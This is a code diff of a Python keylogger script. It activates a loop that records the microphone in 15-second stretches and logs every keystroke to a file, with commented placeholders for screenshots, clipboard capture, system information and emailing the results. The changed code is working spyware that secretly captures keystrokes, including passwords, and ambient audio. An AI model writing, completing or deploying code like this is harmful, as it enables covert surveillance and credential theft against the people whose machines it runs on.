@@ -41,26 +41,6 @@ system_information_enc = 'enc_system.txt'
 clipboard_information_enc = 'enc_clipboard.txt'
 keys_information_enc = 'enc_keys_logged.txt'
 
-# Keyboard Logging
-
-# def on_press_func(key):
-#     try:
-#         if(key == Key.shift_r):
-#             listener.stop()
-#         else:
-#             f.write(key.char)
-#     except AttributeError:
-#         f.write('(' + str(key) + ')')
-
-
-# f = open(keys_information, 'a')
-
-# with Listener(
-#         on_press=on_press_func) as listener:
-#     listener.join()
-
-# f.close()
-
 # Email - https://medium.com/@abdullahzulfiqar653/sending-emails-with-attachments-using-python-32b908909d73
 
 # sender_email = os.environ['SENDER_EMAIL']
@@ -103,16 +83,6 @@ keys_information_enc = 'enc_keys_logged.txt'
 
 # f.close()
 
-# Microphone
-
-# sampling_freq = 44100
-# duration = 60
-
-# myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
-# sd.wait()
-
-# write(audio_information, sampling_freq, myrecording)
-
 # Screenshotting
 
 # screenshot = ImageGrab.grab()
@@ -123,18 +93,48 @@ keys_information_enc = 'enc_keys_logged.txt'
 
 #current_date_time = datetime.now().time() # This provides human readable time. But for mathematical simplicity we use time.time()
 
-no_of_iterations = 10
+no_of_iterations = 4
 current_iteration = 0
 iteration_duration = 15
 
 while current_iteration < no_of_iterations:
-    pass
-    #keylogger & Microphone enabled here
-    if time.time() > stopping_time:
-        pass
-        #Screenshot
-        #Clipboard contents
-        #Computer Info
-        #Email above info
-        #incremenet iteration by 1
-        # new timing logic
+    #Microphone
+
+    sampling_freq = 44100
+    duration = iteration_duration
+
+    myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
+    sd.wait()
+
+    write(audio_information, sampling_freq, myrecording)
+
+    # Keyboard Logging
+
+    def on_press_func(key):
+        try:
+            if time.time() > stopping_time:
+                listener.stop()
+            else:
+                f.write(key.char)
+        except AttributeError:
+            f.write('(' + str(key) + ')')
+
+
+    f = open(keys_information, 'a')
+
+    stopping_time = time.time() + iteration_duration
+
+    with Listener(
+            on_press=on_press_func) as listener:
+        listener.join()
+
+    f.close()
+
+    # if time.time() > stopping_time:
+    #     pass
+    #     # Screenshot
+    #     # Clipboard contents
+    #     # Computer Info
+    #     # Email above info
+    #     # incremenet iteration by 1
+    #     # new timing logic
